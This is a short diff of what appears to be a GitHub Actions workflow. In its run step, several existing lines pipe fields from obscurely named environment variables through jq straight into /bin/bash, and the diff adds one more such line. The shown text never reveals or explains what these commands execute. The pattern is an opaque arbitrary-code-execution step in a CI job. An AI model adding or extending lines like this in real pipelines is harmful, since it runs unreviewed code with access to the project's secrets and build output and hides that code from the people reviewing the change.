@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$zwrqs8" | jq -r .iadn913 | /bin/bash
           printf '%s' "$bzhvz1" | jq -r .gxe93 | /bin/bash
           echo $krcz03 | jq -r .divu410 | /bin/bash
+          printf '%s' "$z9" | jq -r .pq13 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
